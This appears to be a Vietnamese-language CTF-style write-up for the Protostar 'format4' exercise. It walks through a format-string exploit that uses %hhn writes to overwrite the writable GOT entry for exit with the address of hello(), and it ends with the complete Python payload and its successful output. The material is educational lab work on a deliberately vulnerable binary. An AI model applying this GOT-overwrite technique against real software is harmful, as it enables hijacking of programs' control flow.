---
layout: post
title: format4
---

Trong bài này, chúng ta sẽ nghiên cứu cách dùng `printf` và `%n` để ghi giá trị địa chỉ nhằm mục tiêu điều hướng chương trình.
Sau đây là source code và asm code của chương trình format4.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}
```
```asm
0x080484b4 <hello+0>:   push   ebp
0x080484b5 <hello+1>:   mov    ebp,esp
0x080484b7 <hello+3>:   sub    esp,0x18
0x080484ba <hello+6>:   mov    DWORD PTR [esp],0x80485f0
0x080484c1 <hello+13>:  call   0x80483dc <puts@plt>
0x080484c6 <hello+18>:  mov    DWORD PTR [esp],0x1
0x080484cd <hello+25>:  call   0x80483bc <_exit@plt>
0x080484d2 <vuln+0>:    push   ebp
0x080484d3 <vuln+1>:    mov    ebp,esp
0x080484d5 <vuln+3>:    sub    esp,0x218
0x080484db <vuln+9>:    mov    eax,ds:0x8049730
0x080484e0 <vuln+14>:   mov    DWORD PTR [esp+0x8],eax
0x080484e4 <vuln+18>:   mov    DWORD PTR [esp+0x4],0x200
0x080484ec <vuln+26>:   lea    eax,[ebp-0x208]
0x080484f2 <vuln+32>:   mov    DWORD PTR [esp],eax
0x080484f5 <vuln+35>:   call   0x804839c <fgets@plt>
0x080484fa <vuln+40>:   lea    eax,[ebp-0x208]
0x08048500 <vuln+46>:   mov    DWORD PTR [esp],eax
0x08048503 <vuln+49>:   call   0x80483cc <printf@plt>
0x08048508 <vuln+54>:   mov    DWORD PTR [esp],0x1
0x0804850f <vuln+61>:   call   0x80483ec <exit@plt>
0x08048514 <main+0>:    push   ebp
0x08048515 <main+1>:    mov    ebp,esp
0x08048517 <main+3>:    and    esp,0xfffffff0
0x0804851a <main+6>:    call   0x80484d2 <vuln>
0x0804851f <main+11>:   mov    esp,ebp
0x08048521 <main+13>:   pop    ebp
0x08048522 <main+14>:   ret
```

Mục tiêu cụ thể là tìm cách để gọi hàm `hello`, vốn dĩ không hề được gọi trong flow của chương trình format4.
Hàm `hello` có địa chỉ là `0x080484b4`.

Để điều hướng được chương trình, ta sẽ cần ghi một lệnh `jmp` hoặc `call` đến địa chỉ của `hello`.
Như đã biết, để ghi được lệnh, hàm `printf` sẽ cần được gọi trước. Như vậy, điều hướng có thể xảy ra sau `printf`.
Ấn tượng ban đầu khi đọc đoạn asm code của chương trình là có lệnh `call` đến hàm `exit@plt` ngay sau `printf`.
Chúng ta có thể nghĩ đến giải pháp thay thế lệnh này bằng một lệnh gọi đến `hello`.
Cách làm được nghĩ đến là ghi vào địa chỉ của lệnh cũ tại `0x0804850f`.
Tuy nhiên điều này không thực hiện được vì đây là vùng cấm ghi.
Cụ thể, chúng ta có thể sử dụng gdb để kiểm tra giả thiết này.

```bash
(gdb) maintenance info sections
```
<pre class="memory">
Exec file:
    `/opt/protostar/bin/format4', file type elf32-i386.
    0x8048114->0x8048127 at 0x00000114: .interp ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048128->0x8048148 at 0x00000128: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048148->0x804816c at 0x00000148: .note.gnu.build-id ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x804816c->0x80481a8 at 0x0000016c: .hash ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x80481a8->0x80481cc at 0x000001a8: .gnu.hash ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x80481cc->0x804826c at 0x000001cc: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x804826c->0x80482cf at 0x0000026c: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x80482d0->0x80482e4 at 0x000002d0: .gnu.version ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x80482e4->0x8048304 at 0x000002e4: .gnu.version_r ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048304->0x8048314 at 0x00000304: .rel.dyn ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048314->0x804834c at 0x00000314: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x804834c->0x804837c at 0x0000034c: .init ALLOC LOAD READONLY CODE HAS_CONTENTS
    0x804837c->0x80483fc at 0x0000037c: .plt ALLOC LOAD READONLY CODE HAS_CONTENTS
    <span style="color:aqua">0x8048400->0x80485cc at 0x00000400: .text ALLOC LOAD READONLY CODE HAS_CONTENTS</span>
    0x80485cc->0x80485e8 at 0x000005cc: .fini ALLOC LOAD READONLY CODE HAS_CONTENTS
    0x80485e8->0x8048613 at 0x000005e8: .rodata ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048614->0x8048618 at 0x00000614: .eh_frame ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8049618->0x8049620 at 0x00000618: .ctors ALLOC LOAD DATA HAS_CONTENTS
    0x8049620->0x8049628 at 0x00000620: .dtors ALLOC LOAD DATA HAS_CONTENTS
    0x8049628->0x804962c at 0x00000628: .jcr ALLOC LOAD DATA HAS_CONTENTS
    0x804962c->0x80496fc at 0x0000062c: .dynamic ALLOC LOAD DATA HAS_CONTENTS
    0x80496fc->0x8049700 at 0x000006fc: .got ALLOC LOAD DATA HAS_CONTENTS
    0x8049700->0x8049728 at 0x00000700: .got.plt ALLOC LOAD DATA HAS_CONTENTS
    0x8049728->0x8049730 at 0x00000728: .data ALLOC LOAD DATA HAS_CONTENTS
    0x8049730->0x8049740 at 0x00000730: .bss ALLOC
    0x0000->0x0b40 at 0x00000730: .stab READONLY HAS_CONTENTS
    0x0000->0x3bf3 at 0x00001270: .stabstr READONLY HAS_CONTENTS
    0x0000->0x0039 at 0x00004e63: .comment READONLY HAS_CONTENTS
</pre>

Địa chỉ `0x0804850f` nằm trong vùng `.text`, tức là vùng lệnh chính của chương trình.
Vùng này có tag là `READONLY` nên không thể ghi vào được.

Như vậy ta sẽ cần tìm một vị trí khác nằm trong `call exit@plt`.
Để kiểm tra xem có thể làm gì với hàm này, ta sẽ kiểm tra asm code.

```asm
0x080483ec <exit@plt+0>:        jmp    DWORD PTR ds:0x8049724
0x080483f2 <exit@plt+6>:        push   0x30
0x080483f7 <exit@plt+11>:       jmp    0x804837c
```

Trong `call exit@plt`, ta có ngay 1 lệnh `jmp`.
Lệnh này sẽ nhảy đến địa chỉ được lưu tại `0x08049724`. `0x08049724` là 1 vùng trong _GLOBAL_OFFSET_TABLE.
Rất may mắn, vùng này cho phép ghi (không có tag `READONLY`).

<pre class="memory">
    <span style="color:aqua">0x8049700->0x8049728 at 0x00000700: .got.plt ALLOC LOAD DATA HAS_CONTENTS</span>
</pre>

Như vậy, chúng ta đã xác định được địa chỉ cần ghi và cả giá trị.
Việc tiếp theo là dựng lên formatted string từ những thông tin này.
Làm tương tự như các bài trước. ta tìm được tham số cần lưu cho `%n` của `printf` là tham số thứ 4.
Thực ra, vì giá trị cũ và mới tại `0x08049724` là `0x080483f2` và `0x080484b4`.
Phần khác nhau chỉ là 2 byte đầu, tại địa chỉ `0x08049724` và `0x08049725` nên ta sẽ chỉ cần thay đổi 2 byte này là đủ.
Chúng ta sẽ dùng cách lưu từng byte ở bài trước với `%hhn` thay vì `%n`.
Formatted string là gồm 4 byte địa chỉ cần ghi thứ nhất, 4 byte địa chỉ cần ghi thứ hai, và các giá trị cần in thêm.
Để thuận tiện, chúng ta sẽ ghi vào địa chỉ thứ hai trước, và giá trị là `0x84`.
Qua tính toán, ta cần in thêm 124 ký tự (`0x84` tương đương 132 ký tự tổng, trừ đi 8 ký tự cho địa chỉ cần ghi).
Sau đó cần thêm 48 ký tự để đạt được giá trị `0xb4`.

Tổng hợp lại, formatted string sẽ như sau.

```bash
python -c 'print "\x24\x97\x04\x08" + "\x25\x97\x04\x08" + "%124x" + "%5$hhn" + "%48x" + "%4$hhn"'
```
<pre class="memory">
$%                                                                                                                         200                                        b7fd8420
<span style="color:aqua">code execution redirected! you win</span>
</pre>

Mục tiêu đã hoàn thành!
## Ref
```bash
user@protostar:~$ format4 <<< $(python -c 'print "\x24\x97\x04\x08" + "\x25\x97\x04\x08" + "%124x" + "%5$hhn" + "%48x" + "%4$hhn"')
$%                                                                                                                         200                                        b7fd8420
code execution redirected! you win
```
